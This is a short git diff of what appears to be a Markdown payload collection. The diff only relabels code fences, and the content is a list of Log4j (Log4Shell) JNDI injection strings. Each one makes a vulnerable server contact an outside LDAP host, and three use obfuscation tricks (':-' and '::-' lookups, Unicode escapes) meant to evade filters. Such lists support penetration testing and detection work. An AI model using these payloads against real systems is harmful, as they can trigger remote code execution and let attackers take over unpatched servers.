@@ -110,22 +110,22 @@
 # Payloads
 ## Log4j
 
-```
+```http
 ${jndi:ldap://xxxxx.burpcollaborator.net/a}
 ```
 
 ### ":-" notation
-```
+```http
 ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
 ```
 
 ### Unicode Characters (JSON REST API request)
-```
+```http
 ${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
 ```
 
 ### "::-" notation
-```
+```http
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
 ```
 
